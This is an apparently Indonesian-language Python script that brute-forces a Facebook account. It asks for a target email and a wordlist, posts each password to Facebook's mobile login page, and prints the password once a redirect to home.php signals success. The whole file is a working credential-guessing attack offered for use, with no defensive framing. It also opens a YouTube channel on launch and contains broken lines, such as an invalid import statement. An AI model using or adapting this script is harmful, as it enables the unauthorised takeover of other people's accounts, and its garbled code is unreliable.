#!/bin/usr/python3
# -*- coding: utf-8: -*-

# modules

import requests
import os.path
import os
from os import path
from import print
from pyfiglet import Figlet
import re

# banner

FAGHP = ("""
\033[37m╔════════════════════════════════════╗
\033[37m║ \033[33mAuthor      \033[31m:\033[33m MR.FAGHP BLACK-404/F \033[37m║
\033[37m║ \033[33mTeam        \033[31m:\033[33m Zez         \033[37m║
\033[37m║ \033[33mYt          \033[31m:\033[33m FAGHP                \033[37m║
\033[37m║ \033[33mWa          \033[31m:\033[33m +6281313537943       \033[37m║
\033[37m║ \033[33mYt Team     \033[31m:\033[33m NANI        \033[37m║
\033[37m╚════════════════════════════════════╝\n
""")

# mulai
os.system('xdg-open https://youtube.com/channel/UCFggfLWFCmGGyb2VH2EBfBQ')
os.system('clear')
print(FAGHP)
print('\033[37m{\033[31m!\033[37m} \033[31mMasukan Email Target\n')
email = input("\033[37mEmail \033[31m:\033[37m ")
print('\n\033[37m{\033[31m!\033[37m} \033[31mMasukan Wordlist\n')
word = input('\033[37mWordlist \033[31m:\033[37 ')
exist = os.path.isfile(word)
if exist == False:
			print('\n\033[37m{\033[31m!\033[37m} \033[31mMASUKAN WORDLIST YG BENER!!!!')
else:
				url = 'https://m.facebook.com/login.php'
				os.system('clear')
				print(FAGHP)
				print('\n\033[37m{\033[31m+\033[37m}\033[32m Mulai Crack : ' + email)
				arq = open(word, 'r').readlines()
				for line in arq:
					password = line.strip()
					http = requests.post(url, data={'email':email, 'pass':password, 'login':'Log In'}, allow_redirects=True)
					content = http.content
					d = http.cookies
					status = http.status_code
					sd = http.url
					if 'home.php' in sd:
						os.system('clear')
						print(FAGHP)
						print('\n\033[37m{\033[31m+\033[37m} \033[32mPassword di temukan')
						print('\033[37m{\033[31m+\033[37m} \033[32mPassword adalah : ' +password)
						exit()
					else:
						os.system('clear')
						print(FAGHP)
						print('\n\033[37m{\033[31m-\033[37m} \033[31mPassword blom ditermukan : ' +password)
